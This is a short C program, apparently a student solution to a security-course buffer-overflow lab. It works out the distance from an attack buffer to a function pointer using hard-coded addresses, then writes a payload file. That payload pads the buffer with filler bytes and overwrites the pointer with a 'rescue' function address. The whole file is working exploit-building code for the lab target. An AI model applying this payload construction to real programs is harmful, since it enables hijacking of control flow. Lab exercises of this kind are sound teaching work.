#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "util-program.h"


int main(int argc, char **argv)
{
    /* YOUR CODE: Generate buf appropriately */
    long attack_buffer_addr =  0xFFFFD057;
    long funcptr_addr = 0xFFFFD088;
    long rescue_addr = 0x8049279;
    int offset = funcptr_addr - attack_buffer_addr;
    printf("Offset: %d\n", offset);
    
    char attack3_buffer[offset + 4]; // offsets key + 4 bytes for functionPtr
    memset(attack3_buffer, '*', offset);
    memcpy(attack3_buffer + offset, &rescue_addr, 4);

    write_to_file( "payloads/attack3-payload", attack3_buffer, sizeof(attack3_buffer), FILE_CLEAR );
    exit(0);
}